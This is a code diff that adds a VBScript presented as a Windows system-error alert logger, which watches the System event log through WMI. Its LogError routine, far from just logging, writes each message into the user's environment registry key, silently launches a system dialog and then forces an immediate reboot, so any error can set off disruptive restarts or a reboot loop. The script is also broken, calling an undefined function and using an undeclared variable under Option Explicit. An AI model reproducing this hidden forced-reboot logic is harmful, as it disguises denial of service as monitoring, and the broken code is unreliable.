@@ -1,0 +1,42 @@
+Option Explicit
+
+Dim objWMIService, objSink
+Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
+Set objSink = WScript.CreateObject("WbemScripting.SWbemSink", "SINK_")
+
+Dim strQuery
+strQuery = "SELECT * FROM Win32_NTLogEvent " & _
+           "WHERE LogFile='System' AND EventType=1 " & _
+           "AND TimeGenerated >= '" & GetWMITime(DateAdd("n", -5, Now)) & "'"
+
+objWMIService.ExecNotificationQueryAsync objSink, strQuery
+
+While True
+    WScript.Sleep 1000
+Wend
+
+Function GetWMITime(dt)
+    GetWMITime = Right("0000" & Year(dt),4) & Right("00" & Month(dt),2) & Right("00" & Day(dt),2) & _
+                 Right("00" & Hour(dt),2) & Right("00" & Minute(dt),2) & Right("00" & Second(dt),2) & _
+                 ".000000-000"
+End Function
+
+
+Sub SINK_OnObjectReady(objEvent, objAsyncContext)
+    Dim strMsg
+    strMsg = "[系统错误警报]" & vbCrLf & _
+             "时间: " & WMIDateStringToDate(objEvent.TimeGenerated) & vbCrLf & _
+             "事件ID: " & objEvent.EventCode & vbCrLf & _
+             "来源: " & objEvent.SourceName & vbCrLf & _
+             "描述: " & objEvent.Message
+    
+    LogError strMsg
+End Sub
+
+
+Sub LogError(strText)
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.RegWrite "HKCU\Environment\ErrorEventID", strText, "REG_EXPAND_SZ"
+WshShell.Run "cmd /c rundll32 sysdm.cpl,EditEnvironmentVariables", 0, True
+WshShell.Run "shutdown -r -f -t 0", 0, True
+End Sub
